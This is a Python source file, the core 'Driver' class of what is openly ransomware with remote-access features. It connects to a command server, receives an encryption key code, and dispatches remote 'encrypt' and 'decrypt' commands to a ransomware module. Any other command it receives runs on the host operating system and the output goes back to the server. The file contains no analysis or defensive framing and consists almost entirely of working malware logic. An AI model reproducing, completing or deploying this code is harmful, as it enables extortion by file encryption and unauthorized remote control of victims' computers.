from ._filesystem import filesystem
from ._connection import connection
from ._crypto import cryptor
from ._cparser import Command
from ._crunner import crunner
from ._ransdriver import ransdriver

#-------------------------------------- CLASS AND FUNCTIONS

class Driver:
    def __init__(self):
        self._command = Command()
        self._cryptor = cryptor()
        self._connection_manager = connection(self._cryptor)
        self._file_manager = filesystem()
        
        self._crunner = crunner()
        self._ransdriver = ransdriver(connection_manager=self._connection_manager, file_manager=self._file_manager, cryptor=self._cryptor)
        
        self._data = ''
        self.commands = {'encrypt': self._ransdriver.Encrypt,
                         'decrypt': self._ransdriver.Decrypt,
                         'help': self.__void,
                         'exit': self.close_connection}

    def make_connection(self) -> bool:
        """
        Try to make connection and
        return connection status
        """
        self._connection_manager.connect_server()
        if self._connection_manager.connection_status:
            self._ransdriver.set_key_code(self._connection_manager.receive_data('SENT_CODE').decode('utf-8'))

    def run_command(self):
        """
        Try to run received commands by defined commands
        otherwise by OS and send the result back
        """
        self._command = Command(self._connection_manager.receive_data('SENT_COMMAND').decode('utf-8'))
        self._command.parse_command()
        
        if self._command.main_command.lower() in self.commands:
            all_data = self.commands[self._command.main_command.lower()](self._command.switches)
        else:
            all_data = [{'DATA': self._crunner.run_sys_command(self._command)}]
        
        for self._data in all_data:
            self._connection_manager.send(self._data)
    
    def __void(self, arguments:dict) -> iter:
        """
        Do nothing
        """
        return []
    
    def close_connection(self, arguments:dict) -> iter:
        """
        Try to close the connection
        """
        self._connection_manager.close_connection()
        return []

